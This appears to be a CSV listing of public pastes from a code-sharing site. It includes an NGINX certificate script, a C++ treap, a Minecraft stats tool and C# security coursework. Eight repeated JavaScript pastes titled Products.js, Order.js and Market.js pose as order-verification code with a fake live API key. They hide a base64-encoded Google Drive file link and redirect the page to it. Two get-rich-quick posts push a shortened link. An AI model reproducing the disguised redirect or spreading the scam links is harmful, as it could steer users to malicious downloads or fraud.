id,title,username,language,date,content
01Gg4AXa,⭐EARN $900 INSTANTLY 2025 MI,SzymonG110,JavaScript,Tuesday 8th of April 2025 06:34:04 AM CDT," 
Pdf https://surl.li/lgybtn


mZ9gB0bMuu
"
4JzbPD8n,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:27:55 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/81490/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wmqgnG7X,Certificate Installer,theinhumaneme,Bash,Tuesday 8th of April 2025 06:21:27 AM CDT,"#!/bin/bash
# ----------------------------------------------------------------------------
#    Code File: certinstall.sh
#    Author: Kalyan Mudumby
#    Date: 08 April 2025
#    Description:
#           Automate and streamline certificate updates for NGINX deployments.
#
#   Built with Love ❤️ by Kalyan Mudumby 🚀
# ----------------------------------------------------------------------------

set -euo pipefail

# Fetch the date in YYYY-MM-DD Format
DATE=$(date +%F)

# Fail if no domain value is passed
if [ -z ""${1:-}"" ]; then
    echo ""Usage: $0 <domain>""
    exit 1
fi

DOMAIN=$1

# Configurable Paths
NGINX_CONF_DIR=""/usr/local/nginx/conf""
NGINX_BACKUP_DIR=""/usr/local/nginx/backup""
GEO_BACKUP_DIR=""$HOME/geocerts/backup""
GEOCERTS_DIR=""$HOME/geocerts""
GITLAB_BASE_URL=""""

# Associative Arrays: domain -> snippet ID
declare -A CRT_SNIPPETS
declare -A KEY_SNIPPETS

# Define per-domain snippet IDs
CRT_SNIPPETS[thesmartice]=
KEY_SNIPPETS[thesmartice]=

CRT_SNIPPETS[thesmartcity311]=
KEY_SNIPPETS[thesmartcity311]=

CRT_SNIPPETS[ilhelpline]=
KEY_SNIPPETS[ilhelpline]=

CRT_SNIPPETS[mahelpline]=
KEY_SNIPPETS[mahelpline]=

CRT_SNIPPETS[vthelplink]=
KEY_SNIPPETS[vthelplink]=

CRT_SNIPPETS[orhelpline]=
KEY_SNIPPETS[orhelpline]=


# Utility Functions
log() {
    echo ""[$(date '+%F %T')] $1""
}

backup() {
    log ""Backing up existing NGINX config""
    sudo mkdir -p ""$NGINX_BACKUP_DIR/${DOMAIN}_$DATE""
    sudo cp -r ""$NGINX_CONF_DIR/""* ""$NGINX_BACKUP_DIR/${DOMAIN}_$DATE""

    log ""Backing up existing certificates to GEOCERTS folder""
    sudo mkdir -p ""$GEO_BACKUP_DIR/$DATE""
    sudo mv ""$NGINX_CONF_DIR/$DOMAIN.crt"" ""$GEO_BACKUP_DIR/${DOMAIN}_$DATE""
    sudo mv ""$NGINX_CONF_DIR/$DOMAIN.key"" ""$GEO_BACKUP_DIR/${DOMAIN}_$DATE""
}

download_certificates() {
    CRT_ID=${CRT_SNIPPETS[$DOMAIN]:-}
    KEY_ID=${KEY_SNIPPETS[$DOMAIN]:-}

    if [ -z ""$CRT_ID"" ] || [ -z ""$KEY_ID"" ]; then
        echo ""Missing snippet IDs for domain '$DOMAIN'""
        exit 1
    fi

    log ""Downloading certificates for $DOMAIN from GitLab snippets""
    sudo mkdir -p ""$GEOCERTS_DIR/$DOMAIN/""
    sudo wget ""$GITLAB_BASE_URL/$KEY_ID/raw/main/$DOMAIN.key"" -O ""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.key""
    sudo wget ""$GITLAB_BASE_URL/$CRT_ID/raw/main/$DOMAIN.crt"" -O ""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.crt""
}

validate_download() {
    log ""Validating downloaded certificate files for $DOMAIN""

    local crt_path=""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.crt""
    local key_path=""$GEOCERTS_DIR/$DOMAIN/$DOMAIN.key""

    if [ ! -f ""$crt_path"" ]; then
        echo ""❌ Error: Missing downloaded file: $DOMAIN.crt""
        exit 1
    fi

    if [ ! -f ""$key_path"" ]; then
        echo ""❌ Error: Missing downloaded file: $DOMAIN.key""
        exit 1
    fi
}

deploy_certificates() {
    log ""Copying new certificates to NGINX config""
    sudo cp -r ""$GEOCERTS_DIR/$DOMAIN/""* ""$NGINX_CONF_DIR""

    log ""Validating nginx config""
    sudo nginx -t

    log ""Restarting nginx""
    sudo systemctl restart nginx.service

    log ""Displaying certificate details:""
    openssl x509 -in ""$NGINX_CONF_DIR/$DOMAIN.crt"" -text -noout
}

log whoami
log pwd
backup
download_certificates
validate_download
deploy_certificates
"
UMny6Ut4,⭐Make $1000 15-MINUTES (BEGINNER) UU,SzymonG110,JavaScript,Tuesday 8th of April 2025 06:20:39 AM CDT," 
Pdf https://surl.li/lgybtn


ZPyB3FY2q4
"
bwmQtwHw,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 06:12:32 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/93639/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
mQbSL5ah,dataNone,TestGuy1,JSON,Tuesday 8th of April 2025 06:00:05 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: 'd89a73dfc72e1d93d5b06c050c8cf5be266b84e9a71766d95ce7b25d91879f3fcfd782e8d35b4367993060880752b726d7d8b0f93b59551622e0d186f76c13fc232e6ca25dc1357e84a52caf51dc93e4ccd8d57cbe9189217e325c7233df5274988bca5c814d2a2300047dbbeb984c5986dd1419fd440df701d6357b9d7b93d0',
  otherdata: [
    '8e2948c5c33455f83253ab14f4d41b7c',
    '38ced6a6cf8242a179aa6e428a3142e3',
    'ea16fd1d82af7920a95b9889b4eaa212',
    '6bac97d94ba7e3ee7efeb781493926b9',
    'fd1f1fe7502c86cb000426c7a512e50a',
    '04fcf27cfd27f859beb6d9e0111e1f9e',
    '4ea501fc21ea1cc740b6f9962582a9bd',
    'ca18635d673562df8dec3c9d7e096627'
  ]
}"
vpz3recg,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:57:11 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/95593/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
2YARGAHH,Password lockout Screen. init_code.lua,GhastlyDoMinic,Lua,Tuesday 8th of April 2025 05:47:49 AM CDT,"-- Required Imports
local libs = require(""libs"")
--

--verables
local password_true = ""God""
--
-- Define the ""main"" function
-- This is the function we want to ""protect""
local function main()
	local hash_ = ""7a0c0b6d""
	
	if checkFileHash(""disk/authenticate"", hash_) then
		--sleep(0.2)
	else
		term.clear() -- clears the terminal
		term.setCursorPos(1,1) -- sets cursor postion
		
		printError(""Security Check Failed! - Shutdown"") -- prints a error message
		pcall(sleep, 5) -- sleeps for 5 seconds
		os.shutdown() -- shutdown CraftOS
	end
	
  while true do
    term.clear()
    term.setCursorPos(1, 1)
    write(""Password:"")
    local password = read(""*"")

    if password == password_true then
      return
    else
      printError(""Incorrect password."")
      pcall(sleep, 5)
    end
  end
end

local leaveloop = true
while leaveloop do
  local ok, err = pcall(main) -- protectedly call main
  
  if ok then
    -- Correct password was entered!
    -- do whatever you want here
	--term.clear()
	--term.setCursorPos(1, 1)
	--shell.run(""src_main.lua"")
	leaveloop = false
  else
    -- There was an error! The contents of the error are stored in ""err""
    if err == ""Terminated"" then
      printError(""\nSorry, but we can't have you terminating this now can we?"")
	  leaveloop = true
      pcall(sleep, 2) -- pcall the sleep function since it is also terminateable.
    end
  end
end"
sPPWGBEw,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:41:48 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/34538/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
hnjEMk8j,pivo,slash0t,C++,Tuesday 8th of April 2025 05:29:49 AM CDT,"//mt19937_64 rnd = mt19937_64((chrono::high_resolution_clock::now().time_since_epoch().count()));
mt19937_64 rnd = mt19937_64(69);

struct bo4ka {
    struct pivo {
        pivo* left = nullptr, * right = nullptr;
        int size, key, priority;
        pivo(int key_, int priority_) : key(key_), priority(priority_), size(1ll) {}
    };

    pivo* root;
    bo4ka(pivo* root_) : root(root_) {}
    bo4ka(vector<int>& a) {
        int n = a.size();

        pivo* tree = nullptr;
        for (int i = 0; i < n; i++) {
            pivo* now = new pivo(a[i], rnd());
            tree = merge(tree, now);
        }

        root = tree;
    }

    void upd(pivo* tree) {
        tree->size = 1;
        if (tree->left) tree->size += tree->left->size;
        if (tree->right) tree->size += tree->right->size;
    }

    typedef pair<pivo*, pivo*> kega;

    // max a key less than min b key
    pivo* merge(pivo* a, pivo* b) {
        if (!a) return b;
        if (!b) return a;

        if (a->priority > b->priority) {
            auto right = merge(a->right, b);
            a->right = right;
            upd(a);
            return a;
        }
        else {
            auto left = merge(a, b->left);
            b->left = left;
            upd(b);
            return b;
        }
    }

    int sz(pivo* tree) {
        return tree ? tree->size : 0;
    }

    kega split(pivo* tree, int k) {
        if (!tree) return { nullptr, nullptr };

        if (sz(tree->left) + 1 <= k) {
            kega p = split(tree->right, k - 1 - sz(tree->left));

            tree->right = p.first;
            upd(tree);

            return { tree, p.second };
        }
        else {
            kega p = split(tree->left, k);

            tree->left = p.second;
            upd(tree);

            return { p.first, tree };
        }
    }

    auto apply(int l, int r, pivo* function(pivo*)) {
        kega q1 = split(root, r);
        kega q2 = split(q1.first, l);
        q2.second = function(q2.second);
        root = merge(q2.first, merge(q2.second, q1.second));
    }

    void order(pivo* tree, vector<int>& ord) {
        if (!tree) return;

        order(tree->left, ord);
        ord.pb(tree->key);
        order(tree->right, ord);
    }

    vector<int> order() {
        vector<int> ord;
        order(root, ord);
        return ord;
    }

    // 1 indexed
    pivo* ctrlx(int l, int r) {
        kega q1 = split(root, r);
        kega q2 = split(q1.first, l - 1);
        root = merge(q2.first, q1.second);
        return q2.second;
    }

    void ctrlv(pivo* v, int k) {
        kega q = split(root, k);
        root = merge(q.first, merge(v, q.second));
    }
};"
gBQWivDE,Untitled,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:26:26 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/09692/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
8xRPsRfX,AdvancementsCounter,Himeji,Python,Tuesday 8th of April 2025 05:23:47 AM CDT,"import os
import json
import requests
from collections import defaultdict
from typing import Dict, Optional, List, Tuple

MOJANG_API = ""https://api.mojang.com/user/profile/""

def get_username(uuid: str) -> Optional[str]:
    """"""Get the username from a UUID using the Mojang API.""""""
    response = requests.get(f""{MOJANG_API}{uuid}"")
    
    if response.status_code == 200:
        data = response.json()
        return data.get('name')
    return None

def validate_path(path: str) -> bool:
    """"""Validate the provided path.""""""
    if not os.path.exists(path):
        print(""Invalid path. Please try again."")
        return False
    
    if not os.path.isdir(path):
        print(""The path is not a directory. Please try again."")
        return False
    
    if not os.listdir(path):
        print(""The directory is empty. Please try again."")
        return False
    
    if not any(os.path.isfile(os.path.join(path, f)) for f in os.listdir(path)):
        print(""The directory does not contain any files. Please try again."")
        return False
    
    return True

def process_advancements(path: str, whitelist: List[str]) -> Tuple[Dict[str, int], Dict[str, int]]:
    """"""Process advancement files and return advancements and user counts.""""""
    advancements = defaultdict(int)
    users = {}
    
    for userfile in os.listdir(path):
        if not userfile.endswith("".json""):
            print(f""{userfile} is not a valid JSON file"")
            continue
            
        uuid = userfile.split(""."")[0]
        user_count = 0
        
        try:
            with open(os.path.join(path, userfile), 'r') as f:
                data = json.load(f)
                
                for key, value in data.items():
                    if not isinstance(value, dict) or not value.get(""done"", False):
                        continue
                        
                    # Check if advancement matches whitelist criteria
                    matches_whitelist = not whitelist or any(key.startswith(item) for item in whitelist)
                    
                    if matches_whitelist:
                        advancements[key] += 1
                        user_count += 1
        except json.JSONDecodeError:
            print(f""Error decoding JSON in file {userfile}"")
            continue
        except Exception as e:
            print(f""Error processing file {userfile}: {e}"")
            continue
            
        users[uuid] = user_count
        
    return dict(advancements), users

def display_results(advancements: Dict[str, int], users: Dict[str, int]) -> None:
    """"""Display the results in a readable format.""""""
    # Sort users by advancement count
    sorted_users = sorted(users.items(), key=lambda item: item[1], reverse=True)
    
    # Print top 10 users
    print(""\nTop 10 users:"")
    for i, (uuid, count) in enumerate(sorted_users[:10]):
        username = get_username(uuid)
        print(f""{username or 'Unknown'} ({uuid}): {count}"")
    
    # Print statistics
    print(f""\nTotal number of users: {len(users)}"")
    print(f""Total number of advancements found: {len(advancements)}"")
    
    # Sort advancements by count
    sorted_advancements = sorted(advancements.items(), key=lambda item: item[1], reverse=True)

    # Print advancements
    print(""\nAdvancements:"")
    for advancement, count in sorted_advancements:
        print(f""{advancement}: {count}"")

def main():
    path = input(""Enter the path to the Advancements folder: "")
    whitelist_input = input(""Enter advancements whitelist (ex. minecraft:mines,minecraft:unlocks): "")
    whitelist = [item.strip() for item in whitelist_input.split("","")] if whitelist_input else []
    
    if not validate_path(path):
        return
    
    advancements, users = process_advancements(path, whitelist)
    display_results(advancements, users)

if __name__ == ""__main__"":
    main()"
atQtMNqB,Products.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 05:11:03 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/98118/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
brVfahNX,Order.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:55:19 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/57946/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
ERaP8u3n,Task 2.3,vovanhik_24,C#,Tuesday 8th of April 2025 04:54:20 AM CDT,"using System;
using Microsoft.ML;
using Microsoft.ML.Data;
using System.Collections.Generic;
using System.Linq;

namespace DDoSDetection
{
    class Program
    {
        static void Main(string[] args)
        {
            var mlContext = new MLContext();

            var trainingData = new List<TrafficData>
            {
                new TrafficData { PacketCount = 50, DataRate = 10, UniquePorts = 2 },
                new TrafficData { PacketCount = 55, DataRate = 12, UniquePorts = 2 },
                new TrafficData { PacketCount = 5000, DataRate = 900, UniquePorts = 50 },
                new TrafficData { PacketCount = 48, DataRate = 9, UniquePorts = 1 },
                new TrafficData { PacketCount = 6000, DataRate = 1100, UniquePorts = 80 }, 
            };

            var data = mlContext.Data.LoadFromEnumerable(trainingData);

            var pipeline = mlContext.Transforms
                .Concatenate(""Features"", nameof(TrafficData.PacketCount), nameof(TrafficData.DataRate), nameof(TrafficData.UniquePorts))
                .Append(mlContext.Clustering.Trainers.KMeans(featureColumnName: ""Features"", numberOfClusters: 2));

            var model = pipeline.Fit(data);

            var predictor = mlContext.Model.CreatePredictionEngine<TrafficData, TrafficPrediction>(model);

            var incomingTraffic = new List<TrafficData>
            {
                new TrafficData { PacketCount = 60, DataRate = 11, UniquePorts = 2 },
                new TrafficData { PacketCount = 7000, DataRate = 1200, UniquePorts = 100 },
                new TrafficData { PacketCount = 45, DataRate = 8, UniquePorts = 1 },
            };

            Console.WriteLine(""Анализ входящего трафика:"");
            foreach (var packet in incomingTraffic)
            {
                var prediction = predictor.Predict(packet);

                if (prediction.ClusterId == 2)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine($""[!] Подозрительный трафик обнаружен! Пакеты: {packet.PacketCount}, Скорость: {packet.DataRate}, Порты: {packet.UniquePorts}"");
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine($""[OK] Нормальный трафик. Пакеты: {packet.PacketCount}, Скорость: {packet.DataRate}, Порты: {packet.UniquePorts}"");
                }
            }

            Console.ResetColor();
        }

        public class TrafficData
        {
            public float PacketCount { get; set; }
            public float DataRate { get; set; }
            public float UniquePorts { get; set; }
        }

        public class TrafficPrediction
        {
            [ColumnName(""PredictedLabel"")]
            public uint ClusterId { get; set; }
            public float[] Distance { get; set; }
        }
    }
}"
nRQHJUR1,Task1.5,vovanhik_24,C#,Tuesday 8th of April 2025 04:50:02 AM CDT,"using System;
using System.Collections.Generic;
using System.Numerics;

namespace RSA
{
    class Program
    {
        private static readonly int p = 61;
        private static readonly int q = 53;
        private static readonly int n = p * q;
        private static readonly int e = 17;
        private static readonly int d = 2753;

        static void Main(string[] args)
        {
            string message = ""Привет"";
            Console.WriteLine($""Оригинальное сообщение: {message}"");

            List<BigInteger> encrypted = EncryptMessage(message);

            Console.Write(""\nЗашифрованное сообщение: "");
            foreach (var val in encrypted)
            {
                Console.Write(val + "" "");
            }

            string decrypted = DecryptMessage(encrypted);
            Console.WriteLine($""\n\nРасшифрованное сообщение: {decrypted}\n\n"");
        }

        static BigInteger EncryptChar(char ch)
        {
            BigInteger m = ch;
            return BigInteger.ModPow(m, e, n);
        }

        static char DecryptChar(BigInteger cipher)
        {
            BigInteger m = BigInteger.ModPow(cipher, d, n);
            return (char)(int)m;
        }

        static List<BigInteger> EncryptMessage(string message)
        {
            List<BigInteger> result = new List<BigInteger>();

            foreach (char ch in message)
            {
                result.Add(EncryptChar(ch));
            }

            return result;
        }

        static string DecryptMessage(List<BigInteger> encrypted)
        {
            string result = """";

            foreach (BigInteger cipher in encrypted)
            {
                result += DecryptChar(cipher);
            }

            return result;
        }
    }
}"
EbRGmtuh,Task1.4,vovanhik_24,C#,Tuesday 8th of April 2025 04:43:38 AM CDT,"using System;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Text;

namespace PasswordHashing
{
    class Program
    {
        static readonly List<string> storedHashes = new List<string>();

        static void Main(string[] args)
        {
            Console.Write(""Введите пароль: "");
            string password = Console.ReadLine();

            string hash = HashPassword(password);
            storedHashes.Add(hash);

            Console.WriteLine($""Пароль: {password}"");
            Console.WriteLine($""Хэш: {hash}"");

            Console.Write(""\nВведите пароль для проверки:"");
            string input = Console.ReadLine();

            if (VerifyPassword(input))
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine(""Пароль верный!"");
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine(""Неверный пароль!"");
            }

            Console.ResetColor();
        }

        static string HashPassword(string password)
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                byte[] bytes = Encoding.UTF8.GetBytes(password);
                byte[] hashBytes = sha256.ComputeHash(bytes);

                StringBuilder builder = new StringBuilder();

                foreach (byte b in hashBytes)
                {
                    builder.Append(b.ToString(""x2""));
                }
                
                return builder.ToString();
            }
        }

        static bool VerifyPassword(string inputPassword)
        {
            string inputHash = HashPassword(inputPassword);
            return storedHashes.Contains(inputHash);
        }
    }
}"
WTzB8tW6,Market.js,Epiphemeral,JavaScript,Tuesday 8th of April 2025 04:39:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/20417/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
